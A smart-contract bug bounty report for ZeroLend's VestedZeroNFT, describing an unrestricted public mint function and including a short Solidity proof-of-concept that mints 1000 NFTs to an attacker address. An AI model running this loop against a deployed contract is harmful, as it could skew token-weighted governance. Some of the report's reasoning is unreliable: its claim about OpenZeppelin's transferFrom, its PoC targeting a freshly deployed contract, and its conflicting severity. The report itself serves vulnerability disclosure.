# Unlimited Minting of VestedZeroNFT

Submitted on Mar 7th 2024 at 23:55:31 UTC by @oxumarkhatab for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29130

Report type: Smart Contract

Report severity: Medium

Target: https://github.com/zerolend/governance

Impacts:
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
## Brief/Intro
In current Implementation , the checks can easily be passed inside the public mint function because all the paramters are user controlled and there is no access control on that function.


## Vulnerability Details

The mint function does not have any access control implemented .
Also there are  checks which can easily be circumvented through careful 
crafting of those parameters and minting unlimited NFTs .

Take a look at this code 

```
    function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) {
        _mint(_who, ++lastTokenId);

        if (_unlockDate == 0) _unlockDate = block.timestamp;
        require(_unlockDate >= block.timestamp, "invalid _unlockDate");

        if (_hasPenalty) {
            require(_upfront == 0, "no upfront when there is a penalty");
            require(_cliffDuration == 0, "no cliff when there is a penalty");
        }

        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: _cliffDuration,
            unlockDate: _unlockDate,
            pendingClaimed: 0,
            upfrontClaimed: 0,
            pending: _pending,
            hasPenalty: _hasPenalty,
            upfront: _upfront,
            linearDuration: _linearDuration,
            createdAt: block.timestamp,
            category: _category
        });

        // fund the contract
        zero.transferFrom(msg.sender, address(this), _pending + _upfront);

        return lastTokenId;
    }

```
First of all , there is no restriction to call this function so attacker can call and exploit it.

The function mints the latest ID NFT to the address passed , 
the attacker will pas his own address
`
        _mint(_who, ++lastTokenId);

`
Now attacker has to make this transaction success by avoiding require failures.
here's how he can do it.

If user pass `_unlockDate` as 0 , then following checks will be passed
`
        if (_unlockDate == 0) _unlockDate = block.timestamp;
        require(_unlockDate >= block.timestamp, "invalid _unlockDate");

`

Now for circumventing Plenty block, user will pass false

`
   if (_hasPenalty) {
            require(_upfront == 0, "no upfront when there is a penalty");
            require(_cliffDuration == 0, "no cliff when there is a penalty");
        }
`
a new Lock is created

`
     tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: _cliffDuration,
            unlockDate: _unlockDate,
            pendingClaimed: 0,
            upfrontClaimed: 0,
            pending: _pending,
            hasPenalty: _hasPenalty,
            upfront: _upfront,
            linearDuration: _linearDuration,
            createdAt: block.timestamp,
            category: _category
        });
`

And lastly some zeroToken needs to be moved from attacker's pocket to VestedZeroNFT contract . Which attacker can easily trick by passing 
pending and upfront amounts as 0 , 
`
        zero.transferFrom(msg.sender, address(this), _pending + _upfront);

`
See the protocol does not use safeTransferFrom , rather transferFrom from openzeppelin standard as it imports as follows 

`
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

`
Looking at OZs implementation , this function returns false on not sucess, 
so whatever amount we pass in as _pending and _upfront , the transfer might fail but transaction will not . That is the sweet spot for attacker.

`
function transferFrom(address from, address to, uint256 value) external returns (bool);
`

The Transaction is sucessfully executed and now the attacker has New NFT.

This process can be repeated for as long as attacker wants to print money out of thin air .

If Governance can be affected by amount of NFTs you have , Attacker has successfully gained the absolute power to screw the governance.

Hence this vulnerability is of critical importance.

## Impact Details

Attacker can have unlimited NFTs at the cost of just gas for transaction : )

If Governance can be affected by amount of NFTs you have , Attacker has successfully gained the absolute power to screw the governance.

Hence this vulnerability is of critical importance.

## Proof of Concept

```solidity

event NewTokenIDMinted(uint);

    function test_InfiniteMint()public {
        address DEPLOYED_VESTED_ZERO_NFT_ADDRESS=address();
        address AttackerAddress=0x37A8d3c717ec8fDc8BD859627F18ce89c31E1E8b;
        VestedZeroNFT vest=new VestedZeroNFT();
        for (uint i = 0; i < 1000; i++) {
            
            uint newTokenId =vest.mint(
                    AttackerAddress,
                    0,
                    0,
                    0, // pass any suitable value 
                    0, // pass any suitable value 
                    0 ,// to  these checks  if (_unlockDate == 0) _unlockDate = block.timestamp; require(_unlockDate >= block.timestamp, "invalid _unlockDate");
                    false,
                    VestCategory.EARLY_ZERO


                );
                emit NewTokenIDMinted(newTokenId);
            
            }

    }
```
